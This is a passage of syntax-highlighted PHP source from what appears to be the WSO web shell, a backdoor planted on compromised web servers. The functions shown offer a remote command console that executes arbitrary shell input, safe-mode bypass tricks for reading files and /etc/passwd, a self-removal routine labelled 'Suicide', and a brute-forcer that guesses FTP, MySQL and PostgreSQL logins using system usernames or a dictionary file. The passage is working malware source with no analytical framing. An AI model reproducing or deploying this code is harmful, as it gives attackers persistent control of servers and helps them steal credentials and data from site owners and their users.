    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;span&amp;gt;Copy (read file)&amp;lt;/span&amp;gt;&amp;lt;form onsubmit=\&#39;g(null,null,&quot;1&quot;,this.param.value);return false;\&#39;&amp;gt;&amp;lt;input type=text name=param&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Glob (list dir)&amp;lt;/span&amp;gt;&amp;lt;form onsubmit=\&#39;g(null,null,&quot;2&quot;,this.param.value);return false;\&#39;&amp;gt;&amp;lt;input type=text name=param&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Curl (read file)&amp;lt;/span&amp;gt;&amp;lt;form onsubmit=\&#39;g(null,null,&quot;3&quot;,this.param.value);return false;\&#39;&amp;gt;&amp;lt;input type=text name=param&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Ini_restore (read file)&amp;lt;/span&amp;gt;&amp;lt;form onsubmit=\&#39;g(null,null,&quot;4&quot;,this.param.value);return false;\&#39;&amp;gt;&amp;lt;input type=text name=param&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&amp;lt;span&amp;gt;Posix_getpwuid (&quot;Read&quot; /etc/passwd)&amp;lt;/span&amp;gt;&amp;lt;table&amp;gt;&amp;lt;form onsubmit=\&#39;g(null,null,&quot;5&quot;,this.param1.value,this.param2.value);return false;\&#39;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;From&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text name=param1 value=0&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;To&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text name=param2 value=1000&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&amp;lt;input type=submit value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt;&amp;lt;/form&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;pre class=&quot;ml1&quot; style=&quot;margin-top:5px&quot; id=&quot;Output&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionConsole</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;stderr_to_out&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">.=</span> <span class="s1">&#39; 2&amp;gt;&amp;1&#39;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;stderr_to_out&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="nb">ob_start</span><span class="p">();</span>
        <span class="k">echo</span> <span class="s2">&quot;d.cf.cmd.value=&#39;&#39;;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
        <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">iconv</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;charset&#39;</span><span class="p">],</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">,</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">$ &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">wsoEx</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]),</span><span class="s2">&quot;</span><span class="se">\n\r\t\\</span><span class="s2">&#39;&amp;#92;&amp;#48;&quot;</span><span class="p">));</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;!.*cd\s+([^;]+)$!&quot;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">],</span><span class="nv">$match</span><span class="p">))</span>  <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$match</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="p">{</span>
                <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="o">@</span><span class="nb">getcwd</span><span class="p">();</span>
                <span class="k">echo</span> <span class="s2">&quot;c_=&#39;&quot;</span><span class="o">.</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;cwd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s2">&quot;d.cf.output.value+=&#39;&quot;</span><span class="o">.</span><span class="nv">$temp</span><span class="o">.</span><span class="s2">&quot;&#39;;&quot;</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s2">&quot;d.cf.output.scrollTop = d.cf.output.scrollHeight;&quot;</span><span class="p">;</span>
        <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">ob_get_clean</span><span class="p">();</span>
        <span class="k">echo</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$temp</span><span class="p">),</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$temp</span><span class="p">;</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;script&amp;gt;</span>
<span class="s2">if(window.Event) window.captureEvents(Event.KEYDOWN);</span>
<span class="s2">var cmds = new Array(&#39;&#39;);</span>
<span class="s2">var cur = 0;</span>
<span class="s2">function kp(e) {</span>
<span class="s2">   var n = (window.Event) ? e.which : e.keyCode;</span>
<span class="s2">   if(n == 38) {</span>
<span class="s2">       cur--;</span>
<span class="s2">       if(cur&amp;gt;=0)</span>
<span class="s2">           document.cf.cmd.value = cmds[cur];</span>
<span class="s2">       else</span>
<span class="s2">           cur++;</span>
<span class="s2">   } else if(n == 40) {</span>
<span class="s2">       cur++;</span>
<span class="s2">       if(cur &amp;lt; cmds.length)</span>
<span class="s2">           document.cf.cmd.value = cmds[cur];</span>
<span class="s2">       else</span>
<span class="s2">           cur--;</span>
<span class="s2">   }</span>
<span class="s2">}</span>
<span class="s2">function add(cmd) {</span>
<span class="s2">   cmds.pop();</span>
<span class="s2">   cmds.push(cmd);</span>
<span class="s2">   cmds.push(&#39;&#39;);</span>
<span class="s2">   cur = cmds.length-1;</span>
<span class="s2">}</span>

<span class="s2">&amp;lt;/script&amp;gt;&quot;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Console&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;form name=cf onsubmit=&quot;if(d.cf.cmd.value==\&#39;clear\&#39;){d.cf.output.value=\&#39;\&#39;;d.cf.cmd.value=\&#39;\&#39;;return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\&#39;\&#39;);}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\&#39;\&#39;);} return false;&quot;&amp;gt;&amp;lt;select name=alias&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;aliases&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$n</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$v</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;optgroup label=&quot;-&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$n</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;-&quot;&amp;gt;&amp;lt;/optgroup&amp;gt;&#39;</span><span class="p">;</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;option value=&quot;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$n</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/option&amp;gt;&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span><span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ajax&#39;</span><span class="p">])</span><span class="o">&amp;&amp;!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/select&amp;gt;&amp;lt;input type=button onclick=&quot;add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\&#39;\&#39;);}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\&#39;\&#39;);}&quot; value=&quot;&amp;gt;&amp;gt;&quot;&amp;gt; &amp;lt;nobr&amp;gt;&amp;lt;input type=checkbox name=ajax value=1 &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">@</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;ajax&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt; send using AJAX &amp;lt;input type=checkbox name=show_errors value=1 &#39;</span><span class="o">.</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span><span class="o">||</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;stderr_to_out&#39;</span><span class="p">]</span><span class="o">?</span><span class="s1">&#39;checked&#39;</span><span class="o">:</span><span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;gt; redirect stderr to stdout (2&amp;gt;&amp;1)&amp;lt;/nobr&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;textarea class=bigarea name=output style=&quot;border-bottom:0;margin:0;&quot; readonly&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]))</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="s2">&quot;$ &quot;</span><span class="o">.</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span><span class="nx">wsoEx</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]));</span>
    <span class="p">}</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/textarea&amp;gt;&amp;lt;table style=&quot;border:1px solid #df5;background-color:#555;border-top:0px;&quot; cellpadding=0 cellspacing=0 width=&quot;100%&quot;&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td width=&quot;1%&quot;&amp;gt;$&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input type=text name=cmd style=&quot;border:0px;width:100%;&quot; onkeydown=&quot;kp(event);&quot;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&#39;</span><span class="p">;</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/form&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;script&amp;gt;d.cf.cmd.focus();&amp;lt;/script&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionLogout</span><span class="p">()</span> <span class="p">{</span>
    <span class="nb">session_destroy</span><span class="p">();</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;bye!&#39;</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionSelfRemove</span><span class="p">()</span> <span class="p">{</span>

    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;yes&#39;</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!\(\d+\)\s.*!&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="k">__FILE__</span><span class="p">)))</span>
            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Shell has been removed&#39;</span><span class="p">);</span>
        <span class="k">else</span>
            <span class="k">echo</span> <span class="s1">&#39;unlink error!&#39;</span><span class="p">;</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;yes&#39;</span><span class="p">)</span>
        <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Suicide&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;Really want to remove the shell?&amp;lt;br&amp;gt;&amp;lt;a href=# onclick=&quot;g(null,null,\&#39;yes\&#39;)&quot;&amp;gt;Yes&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
    <span class="nx">wsoFooter</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">function</span> <span class="nf">actionBruteforce</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">wsoHeader</span><span class="p">();</span>
    <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;h1&amp;gt;Results&amp;lt;/h1&amp;gt;&amp;lt;div class=content&amp;gt;&amp;lt;span&amp;gt;Type:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39; &amp;lt;span&amp;gt;Server:&amp;lt;/span&amp;gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;server&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;ftp&#39;</span> <span class="p">)</span> <span class="p">{</span>
            <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$fp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span> <span class="nv">$port</span><span class="o">?</span><span class="nv">$port</span><span class="o">:</span><span class="mi">21</span><span class="p">);</span>
                <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
                <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ftp_login</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span>
                <span class="o">@</span><span class="nb">ftp_close</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
                <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;mysql&#39;</span> <span class="p">)</span> <span class="p">{</span>
            <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$ip</span><span class="o">.</span><span class="s1">&#39;:&#39;</span><span class="o">.</span><span class="nv">$port</span><span class="o">?</span><span class="nv">$port</span><span class="o">:</span><span class="mi">3306</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span>
                <span class="o">@</span><span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;proto&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;pgsql&#39;</span> <span class="p">)</span> <span class="p">{</span>
            <span class="k">function</span> <span class="nf">bruteForce</span><span class="p">(</span><span class="nv">$ip</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$str</span> <span class="o">=</span> <span class="s2">&quot;host=&#39;&quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;&#39; port=&#39;&quot;</span><span class="o">.</span><span class="nv">$port</span><span class="o">.</span><span class="s2">&quot;&#39; user=&#39;&quot;</span><span class="o">.</span><span class="nv">$login</span><span class="o">.</span><span class="s2">&quot;&#39; password=&#39;&quot;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.</span><span class="s2">&quot;&#39; dbname=postgres&quot;</span><span class="p">;</span>
                <span class="nv">$res</span> <span class="o">=</span> <span class="o">@</span><span class="nb">pg_connect</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
                <span class="o">@</span><span class="nb">pg_close</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
                <span class="k">return</span> <span class="nv">$res</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nv">$success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$attempts</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$server</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;server&#39;</span><span class="p">]);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="p">)</span>
                <span class="k">foreach</span><span class="p">(</span><span class="nv">$temp</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$line</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span> <span class="nv">$line</span><span class="p">);</span>
                    <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;b&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/b&amp;gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="p">}</span>
                    <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;reverse&#39;</span><span class="p">])</span> <span class="p">{</span>
                        <span class="nv">$tmp</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
                        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="o">--</span><span class="nv">$i</span><span class="p">)</span>
                            <span class="nv">$tmp</span> <span class="o">.=</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="nv">$i</span><span class="p">];</span>
                        <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span>
                        <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$tmp</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                            <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
                            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;b&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/b&amp;gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">);</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
        <span class="p">}</span> <span class="k">elseif</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$temp</span> <span class="o">=</span> <span class="o">@</span><span class="nb">file</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;dict&#39;</span><span class="p">]);</span>
            <span class="k">if</span><span class="p">(</span> <span class="nb">is_array</span><span class="p">(</span><span class="nv">$temp</span><span class="p">)</span> <span class="p">)</span>
                <span class="k">foreach</span><span class="p">(</span><span class="nv">$temp</span> <span class="k">as</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nv">$line</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$line</span><span class="p">);</span>
                    <span class="o">++</span><span class="nv">$attempts</span><span class="p">;</span>
                    <span class="k">if</span><span class="p">(</span> <span class="nx">bruteForce</span><span class="p">(</span><span class="nv">$server</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="o">@</span><span class="nv">$server</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">],</span> <span class="nv">$line</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
                        <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;b&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/b&amp;gt;:&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$line</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;&amp;lt;br&amp;gt;&#39;</span><span class="p">;</span>
                    <span class="p">}</span>
                <span class="p">}</span>
        <span class="p">}</span>
